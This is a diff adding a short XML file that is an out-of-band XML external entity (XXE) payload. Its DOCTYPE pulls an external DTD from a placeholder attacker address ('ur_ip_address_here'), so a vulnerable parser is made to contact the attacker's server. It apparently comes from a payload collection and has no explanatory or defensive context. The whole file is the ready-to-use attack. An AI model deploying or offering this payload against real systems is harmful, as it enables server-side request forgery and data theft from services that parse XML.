@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE data SYSTEM "http://ur_ip_address_here.com/" [
+<!ELEMENT data (#ANY)>
+]>
+<data>4</data>
